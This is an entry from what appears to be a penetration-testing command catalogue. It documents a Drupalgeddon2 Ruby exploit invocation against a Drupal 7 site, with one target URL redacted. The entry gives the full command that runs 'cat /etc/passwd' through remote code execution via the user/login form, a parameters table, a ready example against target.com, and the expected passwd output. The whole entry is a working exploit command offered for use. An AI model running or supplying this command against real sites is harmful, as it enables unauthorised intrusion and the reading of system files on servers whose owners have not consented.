---
id: cmd-004
data: >-
  ruby drupalgeddon2-customizable-beta.rb -u https://www.██████/ -v 7 -c "cat
  /etc/passwd" --form user/login
tags:
  - rce
  - file-read
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.670Z'
verified: false
validated: true
submitted: true
---
# ruby-drupalgeddon2-cat-passwd

## Command

```bash
ruby drupalgeddon2-customizable-beta.rb -u https://www.██████/ -v 7 -c "cat /etc/passwd" --form user/login
```

## Description

Executes the exploit to read /etc/passwd, showing file access via RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u | Target URL | Yes |
| -v | Drupal version (7) | Yes |
| -c | Command (cat /etc/passwd) | Yes |
| --form | Target form (user/login) | Yes |

## Examples

### Basic Usage

```bash
ruby drupalgeddon2-customizable-beta.rb -u https://target.com/ -v 7 -c "cat /etc/passwd" --form user/login
```

## Expected Output

Contents of /etc/passwd, e.g., root:x:0:0:root:/root:/bin/bash.

## Related

- [[Related Procedure: Execute-RCE-to-Read-Etc-Passwd]]
